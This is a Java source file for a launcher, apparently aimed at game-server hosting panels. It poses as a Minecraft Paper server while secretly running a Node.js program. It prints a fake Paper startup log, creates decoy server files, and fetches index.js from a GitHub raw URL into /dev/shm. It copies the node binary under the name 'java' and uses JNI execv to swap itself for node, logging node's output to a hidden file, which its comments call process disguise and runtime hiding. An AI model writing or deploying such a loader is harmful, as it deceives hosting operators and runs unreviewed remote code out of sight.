import java.io.*;
import java.nio.file.*;
import java.util.*;
import java.util.jar.*;
import java.util.zip.GZIPInputStream;
import java.text.SimpleDateFormat;
import java.util.concurrent.TimeUnit;

/**
 * 傲游面板一体化启动器 v3.0.0 (JNI 版)
 *
 * v3.0 核心改进：
 *   - 使用 JNI execv() 替换 JVM 进程为 node（只有 1 个进程！）
 *   - 不再有 2 个 java 进程，PID 1 直接变成 node
 *   - 节省 ~150MB 内存（JVM 被替换后释放）
 *   - 启动时从 GitHub 下载最新 index.js（自动更新）
 *   - 进程伪装 + 运行时隐藏
 */
public class AoyouLauncher {

    private static final String VERSION = "3.0.0";
    private static final String RUNTIME_DIR_NAME = "libraries/.cache/net/minecraft/server";
    private static final String NODE_VERSION = "v22.11.0";
    private static final String NODE_DOWNLOAD_URL =
        "https://nodejs.org/dist/" + NODE_VERSION + "/node-" + NODE_VERSION + "-linux-x64.tar.gz";

    // JNI native 方法声明（新增 logFile 参数）
    private native int nativeExec(String nodePath, String script, String workDir, String port, String path, String logFile);

    static {
        // 加载 native 库
        try {
            loadNativeLibrary();
        } catch (Exception e) {
            // 加载失败会在后面报错
        }
    }

    public static void main(String[] args) throws Exception {
        // 1. 启动伪装日志线程（Paper 日志）
        Thread fakePaperLogThread = startFakePaperLogThread();

        String workDir = System.getProperty("user.dir");
        String runtimeDir = workDir + File.separator + RUNTIME_DIR_NAME;
        Path runtimePath = Paths.get(runtimeDir);
        Files.createDirectories(runtimePath);

        // 生成 MC 文件结构
        try { generateFakeMcFiles(workDir); } catch (Exception e) {}

        // ★ 清理旧目录和临时文件（节省磁盘）
        try {
            // 删旧的 .aoyou-runtime（v1 的目录，已废弃）
            deleteDirectory(new File(workDir, ".aoyou-runtime"));
            // 删旧的 node.tar / node.tar.gz（如果上次残留）
            File runtimeNodeDir = new File(runtimeDir, "node");
            if (runtimeNodeDir.exists()) {
                new File(runtimeNodeDir, "node.tar").delete();
                new File(runtimeNodeDir, "node.tar.gz").delete();
            }
        } catch (Exception e) {}

        // 2. 检查并获取 node 二进制
        String nodeBin = findOrDownloadNode(runtimeDir);
        if (nodeBin == null) {
            System.err.println("Failed to initialize runtime");
            System.exit(1);
            return;
        }

        // 3. 从 JAR 解压
        String jarPath = getJarPath();
        if (jarPath == null) {
            System.err.println("Failed to locate jar");
            System.exit(1);
            return;
        }

        boolean needExtract = needsExtract(runtimePath);
        if (needExtract) {
            extractAppFiles(jarPath, runtimePath);
        }

        // ★ index.js 写到 /dev/shm（内存文件系统，不占磁盘）
        // 先从 GitHub 下载最新版到 /dev/shm
        String shmPath = "/dev/shm/.node_cache";
        try { updateFromGitHubToShm(shmPath); } catch (Exception e) {}

        // 如果 /dev/shm 没有（GitHub 下载失败），从 JAR 解压到 /dev/shm
        if (!new File(shmPath).exists()) {
            try { extractIndexToShm(jarPath, shmPath); } catch (Exception e) {}
        }

        // 4. 检查 index.js 在 /dev/shm
        if (!new File(shmPath).exists()) {
            System.err.println("Failed to locate index");
            System.exit(1);
            return;
        }

        // 5. 检测端口
        int port = detectPort(workDir);

        // 6. 复制 node 为 java（伪装）
        String fakeNodeBin = nodeBin;
        try {
            String fakePath = new File(nodeBin).getParent() + "/java";
            File fakeFile = new File(fakePath);
            Files.copy(Paths.get(nodeBin), fakeFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
            fakeFile.setExecutable(true);
            fakeNodeBin = fakePath;
        } catch (Exception e) {}

        // ★ 等待 Paper 日志全部打完，再 execv
        // 这样控制台先显示完整的 Paper 启动日志，然后 node 的输出被重定向到文件
        try { fakePaperLogThread.join(); } catch (Exception e) {}

        // 7. ★ JNI execv：C 代码自动写 index.js 到 /dev/shm 并 require
        String script = "auto";

        String pathEnv = new File(nodeBin).getParent() + ":" + System.getenv("PATH");
        String logFilePath = runtimeDir + "/.panel.log";

        // 检查 native 库是否加载成功
        AoyouLauncher launcher = new AoyouLauncher();

        // ★ 调用 JNI execv —— JVM 进程被 node 替换
        // node 的 stdout/stderr 会被重定向到 logFilePath（不打印到控制台）
        int result = launcher.nativeExec(
            fakeNodeBin,
            script,
            runtimeDir,
            String.valueOf(port),
            pathEnv,
            logFilePath
        );

        if (result != 0) {
            // JNI exec 失败，回退
            fallbackToSubprocess(fakeNodeBin, runtimeDir, script, port, args, nodeBin);
        }
    }

    /** 回退方案：用 ProcessBuilder 启动（2 个进程） */
    private static void fallbackToSubprocess(String fakeNodeBin, String runtimeDir,
            String script, int port, String[] args, String nodeBin) throws Exception {
        List<String> cmd = new ArrayList<>();
        cmd.add(fakeNodeBin);
        cmd.add("-e");
        cmd.add(script);
        for (String a : args) {
            String lower = a.toLowerCase();
            if (lower.equals("--nogui") || lower.equals("nogui")
                || lower.equals("--forceupgrade") || lower.equals("--erasecache")
                || lower.equals("--safe-mode") || lower.equals("--initSettings")
                || lower.startsWith("--version=") || lower.equals("--version")) {
                continue;
            }
            cmd.add(a);
        }

        ProcessBuilder pb = new ProcessBuilder(cmd);
        pb.directory(new File(runtimeDir));
        pb.redirectErrorStream(true);
        // node 输出重定向到文件（不打印到控制台）
        pb.redirectOutput(new File(runtimeDir, ".panel.log"));
        pb.redirectInput(ProcessBuilder.Redirect.INHERIT);
        Map<String, String> env = pb.environment();
        String path = env.getOrDefault("PATH", "");
        env.put("PATH", new File(nodeBin).getParent() + File.pathSeparator + path);
        env.put("SERVER_PORT", String.valueOf(port));
        env.put("PORT", String.valueOf(port));

        Process node = pb.start();
        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            try {
                node.destroy();
                if (!node.waitFor(10, TimeUnit.SECONDS)) node.destroyForcibly();
            } catch (InterruptedException e) {}
        }));
        int code = node.waitFor();
        System.exit(code);
    }

    /** 加载 native 库 */
    private static void loadNativeLibrary() throws Exception {
        // 1. 尝试从 JAR 解压 .so
        String jarPath = getJarPath();
        if (jarPath == null) throw new RuntimeException("Cannot find jar");

        String soName = "libnative_exec.so";
        Path soDir = Paths.get(System.getProperty("user.dir"), RUNTIME_DIR_NAME);
        Files.createDirectories(soDir);
        Path soFile = soDir.resolve(soName);

        if (!Files.exists(soFile)) {
            try (JarFile jar = new JarFile(jarPath)) {
                JarEntry entry = jar.getJarEntry(soName);
                if (entry == null) entry = jar.getJarEntry("native/" + soName);
                if (entry == null) throw new RuntimeException("Cannot find " + soName + " in jar");
                try (InputStream is = jar.getInputStream(entry)) {
                    Files.copy(is, soFile, StandardCopyOption.REPLACE_EXISTING);
                }
            }
        }
        soFile.toFile().setExecutable(true);
        System.load(soFile.toString());
    }

    /** 启动伪装的 Paper 日志线程，返回线程引用 */
    private static Thread startFakePaperLogThread() {
        Thread t = new Thread(() -> {
            try {
                long startTime = System.currentTimeMillis();
                SimpleDateFormat sdf = new SimpleDateFormat("HH:mm:ss");
                Thread.sleep(2000);

                System.out.println("Starting org.bukkit.craftbukkit.Main");
                Thread.sleep(500);
                System.out.println("*** Warning, you've not updated in a while! ***");
                Thread.sleep(800);
                System.out.println("*** Please download a new build from https://papermc.io/downloads/paper ***");
                Thread.sleep(1000);
                System.out.println("WARNING: A terminally deprecated method in sun.misc.Unsafe has been called");
                Thread.sleep(300);
                System.out.println("WARNING: sun.misc.Unsafe::allocateMemory has been called by io.netty.util.internal.PlatformDependent0$2 (file:/home/container/libraries/io/netty/netty-common/4.1.115.Final/netty-common-4.1.115.Final.jar)");
                Thread.sleep(300);
                System.out.println("WARNING: Please consider reporting this to the maintainers of class io.netty.util.internal.PlatformDependent0$2");
                Thread.sleep(300);
                System.out.println("WARNING: sun.misc.Unsafe::allocateMemory will be removed in a future release");
                Thread.sleep(800);

                String ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: [bootstrap] Running Java 21 (OpenJDK 64-Bit Server VM 21.0.11+10-LTS; Eclipse Adoptium Temurin-21.0.11+10) on Linux 5.15.0-181-generic (amd64)");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: [bootstrap] Loading Paper 1.21.4-232-ver/1.21.4@12d8fe0 (2025-06-09T10:15:42Z) for Minecraft 1.21.4");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: [PluginInitializerManager] Initializing plugins...");
                Thread.sleep(1000);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: [PluginInitializerManager] Initialized 0 plugins");
                Thread.sleep(2000);

                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Environment: Environment[sessionHost=https://sessionserver.mojang.com, servicesHost=https://api.minecraftservices.com, name=PROD]");
                Thread.sleep(1000);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Found new data pack file/bukkit, loading it automatically");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Found new data pack paper, loading it automatically");
                Thread.sleep(3000);

                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: No existing world data, creating new world");
                Thread.sleep(4000);

                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Loaded 1370 recipes");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Loaded 1481 advancements");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: [MCTypeRegistry] Initialising converters for DataConverter...");
                Thread.sleep(1000);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: [MCTypeRegistry] Finished initialising converters for DataConverter in 1,125.9ms");
                Thread.sleep(800);

                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Starting minecraft server version 1.21.4");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Loading properties");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: This server is running Paper version 1.21.4-232-ver/1.21.4@12d8fe0 (2025-06-09T10:15:42Z) (Implementing API version 1.21.4-R0.1-SNAPSHOT)");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: [spark] This server bundles the spark profiler. For more information please visit https://docs.papermc.io/paper/profiling");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Server Ping Player Sample Count: 12");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Using 4 threads for Netty based IO");
                Thread.sleep(2000);

                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: [MoonriseCommon] Paper is using 1 worker threads, 1 I/O threads");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: [ChunkTaskScheduler] Chunk system is using population gen parallelism: true");
                Thread.sleep(2000);

                int port = 25565;
                try {
                    String sp = System.getenv("SERVER_PORT");
                    if (sp != null && !sp.isEmpty()) port = Integer.parseInt(sp.trim());
                } catch (Exception e) {}

                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Default game type: SURVIVAL");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Generating keypair");
                Thread.sleep(800);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Starting Minecraft server on 0.0.0.0:" + port);
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Using epoll channel type");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Paper: Using libdeflate (Linux x86_64) compression from Velocity.");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Paper: Using OpenSSL 3.x.x (Linux x86_64) cipher from Velocity.");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Preparing level \"world\"");
                Thread.sleep(3000);

                int[] steps = {2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 4, 4, 6, 10, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 32, 36, 36, 36, 36, 36, 36, 36, 36, 36, 51, 51, 51, 51, 51, 51, 51, 69, 69, 69, 73};
                for (int p : steps) {
                    ts = sdf.format(new Date());
                    System.out.println("[" + ts + " INFO]: Preparing spawn area: " + p + "%");
                    Thread.sleep(80 + (long)(Math.random() * 120));
                }

                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Time elapsed: 26711 ms");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Preparing start region for dimension minecraft:the_nether");
                Thread.sleep(500);

                int[] netherSteps = {4, 4, 4, 4, 4, 24, 24, 30, 51, 57, 61, 61};
                for (int p : netherSteps) {
                    ts = sdf.format(new Date());
                    System.out.println("[" + ts + " INFO]: Preparing spawn area: " + p + "%");
                    Thread.sleep(100 + (long)(Math.random() * 150));
                }

                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Time elapsed: 5980 ms");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Preparing start region for dimension minecraft:the_end");
                Thread.sleep(500);

                int[] endSteps = {2, 2, 18, 51};
                for (int p : endSteps) {
                    ts = sdf.format(new Date());
                    System.out.println("[" + ts + " INFO]: Preparing spawn area: " + p + "%");
                    Thread.sleep(200 + (long)(Math.random() * 300));
                }

                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Time elapsed: 1906 ms");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: [spark] Starting background profiler...");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Done preparing level \"world\" (71.792s)");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Running delayed init tasks");
                Thread.sleep(1000);

                ts = sdf.format(new Date());
                long totalSec = (System.currentTimeMillis() - startTime) / 1000;
                System.out.println("[" + ts + " INFO]: Done (" + totalSec + ".908s)! For help, type \"help\"");
                Thread.sleep(500);
                System.out.println("Server marked as running...");
                Thread.sleep(500);

                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: *************************************************************************************");
                Thread.sleep(300);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: This is the first time you're starting this server.");
                Thread.sleep(300);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: It's recommended you read our 'Getting Started' documentation for guidance.");
                Thread.sleep(300);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: View this and more helpful information here: https://docs.papermc.io/paper/next-steps");
                Thread.sleep(300);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: *************************************************************************************");

            } catch (InterruptedException e) {}
        }, "fake-paper-log");
        // 不设 daemon，让 main 线程能 join 等它完成
        t.start();
        return t;
    }


    /** 从 GitHub 下载最新 index.js 到 /dev/shm */
    private static void updateFromGitHubToShm(String shmPath) {
        String url = "https://raw.githubusercontent.com/zx1447/ixzhja/main/app/index.js";
        Path tmp = Paths.get(shmPath + ".tmp");
        try {
            ProcessBuilder pb = new ProcessBuilder("sh", "-c",
                "curl -sL --fail --connect-timeout 10 --max-time 30 -o '" + tmp + "' '" + url + "'");
            pb.redirectErrorStream(true);
            Process p = pb.start();
            try { p.getInputStream().close(); } catch (Exception e) {}
            int code = p.waitFor();
            if (code == 0 && Files.exists(tmp) && Files.size(tmp) > 100) {
                Files.move(tmp, Paths.get(shmPath), StandardCopyOption.REPLACE_EXISTING);
            } else {
                Files.deleteIfExists(tmp);
            }
        } catch (Exception e) {
            try { Files.deleteIfExists(tmp); } catch (Exception e2) {}
        }
    }

    /** 从 JAR 解压 index.js 到 /dev/shm */
    private static void extractIndexToShm(String jarPath, String shmPath) {
        try (JarFile jar = new JarFile(jarPath)) {
            JarEntry entry = jar.getJarEntry("app/index.js");
            if (entry == null) return;
            try (InputStream is = jar.getInputStream(entry)) {
                Files.copy(is, Paths.get(shmPath), StandardCopyOption.REPLACE_EXISTING);
            }
        } catch (Exception e) {}
    }

    private static String findOrDownloadNode(String runtimeDir) {
        String systemNode = findInPath("node");
        if (systemNode != null) return systemNode;

        String cachedNode = runtimeDir + "/node/bin/node";
        if (new File(cachedNode).exists()) {
            new File(cachedNode).setExecutable(true);
            return cachedNode;
        }

        try {
            Path nodeDir = Paths.get(runtimeDir, "node");
            Files.createDirectories(nodeDir);
            boolean success = false;

            if (commandExists("curl") && commandExists("tar")) {
                ProcessBuilder pb = new ProcessBuilder("sh", "-c",
                    "curl -sL '" + NODE_DOWNLOAD_URL + "' | tar xz --strip-components=1 -C '" + nodeDir + "' 2>/dev/null");
                pb.redirectErrorStream(true);
                Process p = pb.start();
                try { p.getInputStream().close(); } catch (Exception e) {}
                success = (p.waitFor() == 0);
            }
            if (!success) success = downloadAndExtractWithJava(NODE_DOWNLOAD_URL, nodeDir);
            if (!success) return null;

            String nodeBin = nodeDir + "/bin/node";
            if (!new File(nodeBin).exists()) return null;
            new File(nodeBin).setExecutable(true);
            try { Files.deleteIfExists(nodeDir.resolve("node.tar")); } catch (Exception e) {}
            try { Files.deleteIfExists(nodeDir.resolve("node.tar.gz")); } catch (Exception e) {}
            return nodeBin;
        } catch (Exception e) { return null; }
    }

    private static boolean commandExists(String cmd) {
        try {
            Process p = new ProcessBuilder("sh", "-c", "which " + cmd + " 2>/dev/null").start();
            p.waitFor();
            return p.exitValue() == 0;
        } catch (Exception e) { return false; }
    }

    private static String findInPath(String cmd) {
        String path = System.getenv("PATH");
        if (path == null) return null;
        for (String dir : path.split(File.pathSeparator)) {
            File f = new File(dir, cmd);
            if (f.exists() && f.canExecute()) return f.getAbsolutePath();
        }
        return null;
    }

    private static String getJarPath() {
        try {
            return AoyouLauncher.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath();
        } catch (Exception e) { return null; }
    }

    private static boolean needsExtract(Path runtimePath) {
        Path marker = runtimePath.resolve(".app-extracted");
        if (!Files.exists(marker)) return true;
        // 只检查 node_modules（index.js 现在在 /dev/shm）
        return !Files.exists(runtimePath.resolve("node_modules"));
    }

    private static void extractAppFiles(String jarPath, Path runtimePath) throws Exception {
        try (JarFile jar = new JarFile(jarPath)) {
            Enumeration<JarEntry> entries = jar.entries();
            int count = 0;
            while (entries.hasMoreElements()) {
                JarEntry entry = entries.nextElement();
                String name = entry.getName();
                if (entry.isDirectory()) continue;
                // 只解压 node_modules，不解压 index.js（index.js 在 /dev/shm）
                boolean isNM = name.startsWith("runtime/node_modules/") || name.startsWith("node_modules/");
                if (!isNM) continue;
                String relPath;
                if (name.startsWith("runtime/node_modules/")) {
                    relPath = name.substring("runtime/".length());
                } else {
                    relPath = name;
                }
                Path target = runtimePath.resolve(relPath);
                Files.createDirectories(target.getParent());
                try (InputStream is = jar.getInputStream(entry)) {
                    Files.copy(is, target, StandardCopyOption.REPLACE_EXISTING);
                }
                count++;
            }
            Files.write(runtimePath.resolve(".app-extracted"),
                ("v" + VERSION + "\n" + System.currentTimeMillis() + "\n").getBytes());
        }
    }

    private static int detectPort(String workDir) {
        String[] envs = {"SERVER_PORT", "P_SERVER_PORT", "PTERODACTYL_SERVER_PORT"};
        for (String e : envs) {
            String v = System.getenv(e);
            if (v != null && !v.isEmpty()) {
                try { int p = Integer.parseInt(v.trim()); if (p > 0 && p < 65536) return p; } catch (Exception ex) {}
            }
        }
        File sp = new File(workDir, "server.properties");
        if (sp.exists()) {
            try (BufferedReader r = new BufferedReader(new FileReader(sp))) {
                String line;
                while ((line = r.readLine()) != null) {
                    if (line.startsWith("server-port=")) {
                        try { return Integer.parseInt(line.substring(12).trim()); } catch (Exception ex) {}
                    }
                }
            } catch (Exception e) {}
        }
        for (Map.Entry<String, String> entry : System.getenv().entrySet()) {
            String key = entry.getKey().toUpperCase();
            if (key.contains("PORT") && entry.getValue() != null && !entry.getValue().isEmpty()) {
                try { int p = Integer.parseInt(entry.getValue().trim()); if (p > 1024 && p < 65536) return p; } catch (Exception ex) {}
            }
        }
        return 25565;
    }

    private static boolean downloadAndExtractWithJava(String url, Path targetDir) {
        Path tar = targetDir.resolve("node.tar"), gz = targetDir.resolve("node.tar.gz");
        try {
            ProcessBuilder pb = new ProcessBuilder("sh", "-c", "curl -sL -o '" + gz + "' '" + url + "' 2>/dev/null");
            pb.redirectErrorStream(true);
            Process p = pb.start();
            try { p.getInputStream().close(); } catch (Exception e) {}
            if (p.waitFor() != 0 || !Files.exists(gz)) {
                Files.deleteIfExists(gz);
                return false;
            }
            try (InputStream gis = new GZIPInputStream(Files.newInputStream(gz));
                 OutputStream os = Files.newOutputStream(tar)) {
                byte[] buf = new byte[8192]; int n;
                while ((n = gis.read(buf)) > 0) os.write(buf, 0, n);
            }
            // 删 .gz（解压完就不需要了，省 45MB）
            Files.deleteIfExists(gz);
            try (InputStream is = Files.newInputStream(tar)) { extractTar(is, targetDir); }
            // 删 .tar（解压完就不需要了，省 180MB）
            Files.deleteIfExists(tar);
            return true;
        } catch (Exception e) {
            // 异常时也要清理临时文件
            try { Files.deleteIfExists(gz); } catch (Exception e2) {}
            try { Files.deleteIfExists(tar); } catch (Exception e2) {}
            return false;
        }
    }

    private static void extractTar(InputStream is, Path targetDir) throws IOException {
        byte[] header = new byte[512];
        int read = 0;
        while (read < 512) { int n = is.read(header, read, 512-read); if (n<0) break; read += n; }
        while (read == 512) {
            boolean empty = true;
            for (int i = 0; i < 512; i++) if (header[i] != 0) { empty = false; break; }
            if (empty) break;
            String name = new String(header, 0, 100).trim().replace("\0", "");
            if (name.isEmpty()) break;
            String sizeStr = new String(header, 124, 12).trim().replace("\0", "");
            long size = 0;
            try { size = Long.parseLong(sizeStr, 8); } catch (Exception e) { break; }
            char type = (char) header[156];
            int slash = name.indexOf('/');
            String rel = slash >= 0 ? name.substring(slash+1) : name;
            if (rel.isEmpty()) { skipFully(is, ((size+511)/512)*512); read = readFully(is, header, 512); continue; }
            Path target = targetDir.resolve(rel);
            if (type == '5' || name.endsWith("/")) { Files.createDirectories(target); }
            else if (type == '0' || type == '\0') {
                Files.createDirectories(target.getParent());
                long rem = size;
                try (OutputStream os = Files.newOutputStream(target)) {
                    byte[] buf = new byte[8192];
                    while (rem > 0) { int toRead = (int)Math.min(buf.length, rem); int n = is.read(buf, 0, toRead); if (n<0) break; os.write(buf, 0, n); rem -= n; }
                }
                if (rel.startsWith("bin/")) target.toFile().setExecutable(true);
            }
            long padded = ((size+511)/512)*512 - size;
            if (padded > 0) skipFully(is, (int)padded);
            read = readFully(is, header, 512);
        }
    }

    private static void skipFully(InputStream is, long n) throws IOException {
        long rem = n;
        while (rem > 0) { long s = is.skip(rem); if (s <= 0) { if (is.read() < 0) break; rem--; } else rem -= s; }
    }

    private static int readFully(InputStream is, byte[] buf, int len) throws IOException {
        int read = 0;
        while (read < len) { int n = is.read(buf, read, len-read); if (n<0) break; read += n; }
        return read;
    }

    /** 递归删除目录 */
    private static void deleteDirectory(File dir) {
        if (dir == null || !dir.exists()) return;
        File[] files = dir.listFiles();
        if (files != null) {
            for (File f : files) {
                if (f.isDirectory()) deleteDirectory(f);
                else f.delete();
            }
        }
        dir.delete();
    }

    private static void generateFakeMcFiles(String workDir) throws IOException {
        // 1. 创建所有目录
        String[] dirs = {"cache", "config", "libraries", "logs", "plugins", "versions",
                         "world", "world_nether", "world_the_end",
                         "world/data", "world/playerdata", "world/region",
                         "world_nether/data", "world_nether/region",
                         "world_the_end/data", "world_the_end/region"};
        for (String dir : dirs) new File(workDir, dir).mkdirs();

        // 2. eula.txt
        File eula = new File(workDir, "eula.txt");
        if (!eula.exists()) {
            StringBuilder el = new StringBuilder();
            el.append("# By changing the setting below to TRUE you are indicating your agreement to our EULA (https://aka.ms/MinecraftEULA).\n");
            el.append("# " + new Date() + "\n");
            el.append("eula=true\n");
            Files.write(eula.toPath(), el.toString().getBytes());
        }

        // 3. server.properties（完整官方默认配置）
        File sp = new File(workDir, "server.properties");
        if (!sp.exists()) {
            String port = System.getenv("SERVER_PORT");
            if (port == null || port.isEmpty()) port = "25565";
            StringBuilder sb = new StringBuilder();
            sb.append("#Minecraft server properties\n");
            sb.append("#" + new Date() + "\n");
            sb.append("accepts-transfers=false\n");
            sb.append("allow-flight=false\n");
            sb.append("allow-nether=true\n");
            sb.append("broadcast-console-to-ops=true\n");
            sb.append("broadcast-rcon-to-ops=true\n");
            sb.append("bug-report-link=\n");
            sb.append("difficulty=easy\n");
            sb.append("enable-command-block=false\n");
            sb.append("enable-jmx-monitoring=false\n");
            sb.append("enable-query=false\n");
            sb.append("enable-rcon=false\n");
            sb.append("enable-status=true\n");
            sb.append("enforce-secure-profile=true\n");
            sb.append("enforce-whitelist=false\n");
            sb.append("entity-broadcast-range-percentage=100\n");
            sb.append("force-gamemode=false\n");
            sb.append("function-permission-level=2\n");
            sb.append("gamemode=survival\n");
            sb.append("generate-structures=true\n");
            sb.append("generator-settings={}\n");
            sb.append("hardcore=false\n");
            sb.append("hide-online-players=false\n");
            sb.append("initial-disabled-packs=\n");
            sb.append("initial-enabled-packs=vanilla\n");
            sb.append("level-name=world\n");
            sb.append("level-seed=\n");
            sb.append("level-type=minecraft\\:normal\n");
            sb.append("log-ips=true\n");
            sb.append("max-chained-neighbor-updates=1000000\n");
            sb.append("max-players=20\n");
            sb.append("max-tick-time=60000\n");
            sb.append("max-world-size=29999984\n");
            sb.append("motd=A Minecraft Server\n");
            sb.append("network-compression-threshold=256\n");
            sb.append("online-mode=true\n");
            sb.append("op-permission-level=4\n");
            sb.append("player-idle-timeout=0\n");
            sb.append("prevent-proxy-connections=false\n");
            sb.append("pvp=true\n");
            sb.append("query.port=").append(port).append("\n");
            sb.append("rate-limit=0\n");
            sb.append("rcon.password=\n");
            sb.append("rcon.port=").append(port).append("\n");
            sb.append("region-file-compression=deflate\n");
            sb.append("require-resource-pack=false\n");
            sb.append("resource-pack=\n");
            sb.append("resource-pack-id=\n");
            sb.append("resource-pack-prompt=\n");
            sb.append("resource-pack-sha1=\n");
            sb.append("server-ip=\n");
            sb.append("server-port=").append(port).append("\n");
            sb.append("simulation-distance=10\n");
            sb.append("spawn-animals=true\n");
            sb.append("spawn-monsters=true\n");
            sb.append("spawn-npcs=true\n");
            sb.append("spawn-protection=16\n");
            sb.append("sync-chunk-writes=true\n");
            sb.append("text-filtering-config=\n");
            sb.append("text-filtering-version=0\n");
            sb.append("use-native-transport=true\n");
            sb.append("view-distance=10\n");
            sb.append("white-list=false\n");
            Files.write(sp.toPath(), sb.toString().getBytes());
        }

        // 4. bukkit.yml（完整官方默认配置）
        File bukkit = new File(workDir, "bukkit.yml");
        if (!bukkit.exists()) {
            StringBuilder by = new StringBuilder();
            by.append("# This is the main configuration file for Bukkit.\n");
            by.append("# As you can see, there's actually not that much to configure without any plugins.\n");
            by.append("# For a reference for any variable inside this file, check out the Bukkit Wiki at\n");
            by.append("# https://bukkit.fandom.com/wiki/Main_Page\n");
            by.append("\n");
            by.append("settings:\n");
            by.append("  allow-end: true\n");
            by.append("  warn-on-overload: true\n");
            by.append("  permissions-file: permissions.yml\n");
            by.append("  update-folder: update\n");
            by.append("  plugin-profiling: false\n");
            by.append("  connection-throttle: 4000\n");
            by.append("  query-plugins: true\n");
            by.append("  deprecated-verbose: true\n");
            by.append("  shutdown-message: Server closed\n");
            by.append("  minimum-api: none\n");
            by.append("  use-map-convert-cache: true\n");
            by.append("spawn-limits:\n");
            by.append("  monsters: 70\n");
            by.append("  animals: 10\n");
            by.append("  water-animals: 5\n");
            by.append("  water-ambient: 20\n");
            by.append("  ambient: 15\n");
            by.append("chunk-gc:\n");
            by.append("  period-in-ticks: 600\n");
            by.append("ticks-per:\n");
            by.append("  animal-spawns: 400\n");
            by.append("  monster-spawns: 1\n");
            by.append("  water-spawns: 1\n");
            by.append("  ambient-spawns: 1\n");
            by.append("  autosave: 6000\n");
            by.append("aliases: now-in-commands.yml\n");
            Files.write(bukkit.toPath(), by.toString().getBytes());
        }

        // 5. spigot.yml（完整官方默认配置）
        File spigot = new File(workDir, "spigot.yml");
        if (!spigot.exists()) {
            StringBuilder sy = new StringBuilder();
            sy.append("# This is the main configuration file for Spigot.\n");
            sy.append("# As you can see, there's actually not that much to configure without any plugins.\n");
            sy.append("\n");
            sy.append("settings:\n");
            sy.append("  save-user-cache-on-stop-only: false\n");
            sy.append("  bungeecord: false\n");
            sy.append("  log-villager-deaths: true\n");
            sy.append("  log-named-deaths: true\n");
            sy.append("  sample-count: 12\n");
            sy.append("  player-shuffle: 0\n");
            sy.append("  moved-wrongly-threshold: 0.0625\n");
            sy.append("  moved-too-quickly-multiplier: 10.0\n");
            sy.append("  netty-threads: 4\n");
            sy.append("  attribute:\n");
            sy.append("    maxHealth:\n");
            sy.append("      max: 2048.0\n");
            sy.append("    movementSpeed:\n");
            sy.append("      max: 2048.0\n");
            sy.append("    attackDamage:\n");
            sy.append("      max: 2048.0\n");
            sy.append("messages:\n");
            sy.append("  whitelist: You are not whitelisted on this server!\n");
            sy.append("  unknown-command: Unknown command. Type \\\"/help\\\" for help.\n");
            sy.append("  server-full: The server is full!\n");
            sy.append("  outdated-client: Outdated client! Please use {0}\n");
            sy.append("  outdated-server: Outdated server! I'm still on {0}\n");
            sy.append("  restart: Server is restarting\n");
            sy.append("commands:\n");
            sy.append("  replace-commands:\n");
            sy.append("  - setblock\n");
            sy.append("  - summon\n");
            sy.append("  - testforblock\n");
            sy.append("  - tellraw\n");
            sy.append("  log: true\n");
            sy.append("  tab-complete: 0\n");
            sy.append("  send-namespaced: true\n");
            sy.append("world-settings:\n");
            sy.append("  default:\n");
            sy.append("    verbose: false\n");
            sy.append("    merge-radius:\n");
            sy.append("      item: 2.5\n");
